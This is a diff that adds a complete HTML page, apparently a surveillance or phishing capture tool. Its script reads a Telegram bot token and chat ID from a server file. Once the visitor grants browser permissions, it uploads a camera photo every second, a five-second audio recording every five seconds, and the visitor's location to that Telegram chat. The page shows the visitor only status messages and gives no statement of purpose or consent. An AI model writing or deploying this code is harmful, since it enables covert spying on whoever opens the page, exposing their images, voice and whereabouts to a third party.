@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Camera & Audio Capture</title>
+<style>
+  body {
+    background: #111;
+    color: #eee;
+    font-family: monospace;
+    text-align: center;
+    margin: 30px;
+  }
+  #status {
+    margin-top: 20px;
+    font-size: 1.2rem;
+  }
+</style>
+</head>
+<body>
+
+<h1>Background Capture Running</h1>
+<div id="status">Initializing...</div>
+
+<script>
+(async () => {
+  const statusEl = document.getElementById('status');
+  let TELEGRAM_BOT_TOKEN = '';
+  let TELEGRAM_CHAT_ID = '';
+
+  function log(msg) {
+    console.log(msg);
+    statusEl.textContent = msg;
+  }
+
+  async function loadTelegramConfig() {
+    try {
+      const res = await fetch('server.txt');
+      const text = await res.text();
+      TELEGRAM_BOT_TOKEN = text.match(/TOKEN=(.*)/)[1].trim();
+      TELEGRAM_CHAT_ID = text.match(/CHAT_ID=(.*)/)[1].trim();
+      log('Telegram config loaded');
+    } catch (e) {
+      alert('Failed to load Telegram config!');
+      log('Telegram config load failed');
+    }
+  }
+
+  async function sendFileToTelegram(blob, filename, method) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      log('Telegram config missing!');
+      return;
+    }
+    const formData = new FormData();
+    if(method === 'sendPhoto') formData.append('photo', blob, filename);
+    else if(method === 'sendAudio') formData.append('audio', blob, filename);
+    else formData.append('document', blob, filename);
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`, {
+        method: 'POST',
+        body: formData
+      });
+      const data = await res.json();
+      if (!data.ok) throw new Error(data.description);
+    } catch (e) {
+      log('Telegram send error: ' + e.message);
+    }
+  }
+
+  // Start camera with preferred facingMode (back camera)
+  let videoStream = null;
+  async function startCamera() {
+    if (videoStream) {
+      videoStream.getTracks().forEach(t => t.stop());
+      videoStream = null;
+    }
+    try {
+      videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false });
+      log('Camera started');
+    } catch (e) {
+      log('Camera error: ' + e.message);
+      throw e;
+    }
+  }
+
+  // Take photo from video stream
+  async function takePhoto() {
+    if (!videoStream) return null;
+    const track = videoStream.getVideoTracks()[0];
+    const settings = track.getSettings();
+    const width = settings.width || 640;
+    const height = settings.height || 480;
+
+    const canvas = document.createElement('canvas');
+    canvas.width = width;
+    canvas.height = height;
+    const ctx = canvas.getContext('2d');
+
+    // Create hidden video element to draw current frame
+    const videoEl = document.createElement('video');
+    videoEl.srcObject = videoStream;
+    videoEl.play();
+    await new Promise(res => videoEl.onloadedmetadata = res);
+    ctx.drawImage(videoEl, 0, 0, width, height);
+
+    return new Promise(resolve => {
+      canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
+    });
+  }
+
+  // Audio record for 5 seconds
+  async function recordAudio() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      return new Promise((resolve, reject) => {
+        const recorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+        const chunks = [];
+        recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
+        recorder.onerror = e => reject(e.error);
+        recorder.onstop = () => {
+          stream.getTracks().forEach(t => t.stop());
+          const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+          resolve(audioBlob);
+        };
+        recorder.start();
+        setTimeout(() => recorder.state === 'recording' && recorder.stop(), 5000);
+      });
+    } catch (e) {
+      log('Audio error: ' + e.message);
+      return null;
+    }
+  }
+
+  // Get Location once on page load
+  async function sendLocationOnce() {
+    if (!navigator.geolocation) {
+      log('Geolocation not supported');
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const { latitude, longitude, accuracy } = pos.coords;
+      const message = `📍 Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ±${accuracy} meters`;
+      await sendMessageToTelegram(message);
+      log('Location sent');
+    }, (err) => {
+      log('Location permission denied or error');
+    });
+  }
+
+  async function sendMessageToTelegram(text) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      log('Telegram config missing!');
+      return;
+    }
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+      });
+      const data = await res.json();
+      if (!data.ok) throw new Error(data.description);
+    } catch (e) {
+      log('Telegram sendMessage error: ' + e.message);
+    }
+  }
+
+  // Main loop for photo capture every 1 second
+  async function photoLoop() {
+    try {
+      const photo = await takePhoto();
+      if(photo) {
+        await sendFileToTelegram(photo, 'photo.jpg', 'sendPhoto');
+        log('Photo sent');
+      }
+    } catch(e) {
+      log('Photo loop error: ' + e.message);
+    }
+  }
+
+  // Main loop for audio capture every 5 seconds
+  async function audioLoop() {
+    try {
+      const audio = await recordAudio();
+      if(audio) {
+        await sendFileToTelegram(audio, 'audio.webm', 'sendAudio');
+        log('Audio sent');
+      }
+    } catch(e) {
+      log('Audio loop error: ' + e.message);
+    }
+  }
+
+  // Initialization and start all loops
+  await loadTelegramConfig();
+  await startCamera();
+  await sendLocationOnce();
+
+  // Photo every 1 second (use setInterval)
+  setInterval(photoLoop, 1000);
+  // Audio every 5 seconds (use setInterval)
+  setInterval(audioLoop, 5000);
+
+  log('Capture started: Photo(1s), Audio(5s), Location(sent once)');
+
+})();
+</script>
+
+</body>
+</html>
